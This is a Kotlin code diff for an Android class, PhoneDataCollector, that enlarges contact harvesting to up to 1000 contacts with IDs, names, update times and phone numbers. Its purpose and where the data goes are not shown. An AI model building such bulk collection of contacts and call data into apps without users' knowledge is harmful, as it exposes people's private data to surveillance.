@@ -108,21 +108,55 @@ class PhoneDataCollector(private val context: Context) {
     }
 
     private fun collectContacts(): JSONArray {
-        val a = JSONArray()
+        val contacts = linkedMapOf<String, JSONObject>()
+
         context.contentResolver.query(
-            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
-            null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
+            ContactsContract.Contacts.CONTENT_URI,
+            arrayOf(
+                ContactsContract.Contacts._ID,
+                ContactsContract.Contacts.DISPLAY_NAME,
+                ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP,
+            ),
+            null, null, "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
         )?.use { c ->
-            var n = 0
-            while (c.moveToNext() && n++ < 200) {
-                a.put(JSONObject().apply {
-                    put("name", c.getString(0))
-                    put("number", c.getString(1))
-                })
+            while (c.moveToNext() && contacts.size < 1000) {
+                val contactId = c.getString(0).orEmpty()
+                if (contactId.isBlank()) continue
+                contacts[contactId] = JSONObject().apply {
+                    put("contactId", contactId)
+                    put("name", c.getString(1).orEmpty())
+                    put("lastUpdatedAt", if (!c.isNull(2)) c.getLong(2) else 0L)
+                    put("numbers", JSONArray())
+                }
             }
         }
-        return a
+
+        context.contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            arrayOf(
+                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
+                ContactsContract.CommonDataKinds.Phone.NUMBER,
+            ),
+            null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
+        )?.use { c ->
+            while (c.moveToNext()) {
+                val contactId = c.getString(0).orEmpty()
+                val number = c.getString(1)?.trim().orEmpty()
+                if (contactId.isBlank() || number.isBlank()) continue
+                val contact = contacts[contactId] ?: continue
+                val numbers = contact.optJSONArray("numbers") ?: JSONArray().also { contact.put("numbers", it) }
+                if ((0 until numbers.length()).none { numbers.optString(it) == number }) {
+                    numbers.put(number)
+                }
+            }
+        }
+
+        val result = JSONArray()
+        contacts.values
+            .sortedBy { it.optString("name").lowercase() }
+            .take(1000)
+            .forEach { result.put(it) }
+        return result
     }
 
     private fun collectCalls(): JSONArray {
